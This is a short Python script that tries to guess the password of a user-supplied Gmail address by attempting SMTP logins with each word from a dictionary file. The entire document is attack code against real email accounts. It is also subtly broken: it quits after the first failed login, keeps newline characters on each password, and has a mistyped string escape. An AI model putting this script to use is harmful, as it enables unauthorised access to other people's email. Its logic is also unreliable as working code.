import smtplib
import sys

#start smtp gmail server
smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()

#collect information of user and password database
user = input('Enter the desired email to attack: ')
passwfile = 'password-dictionary.txt'

#iterates through each password
with open(passwfile, 'r') as passwordfile:
    for password in passwordfile:
        #tries to login using each password in the file
        try:
            smtpserver.login(user, password)
            sys.exit(f'password {password} has been found')
       #server likely to disconnect after a given time
        except smtplib.SMTPServerDisconnected:
            sys.exit('Server has disconnected')
       #original data may not be authentcated
        except smtplib.SMTPAuthenticationError:
            sys.exit('Server can\t authenticate SMTP details')
    print("Password not in file!")
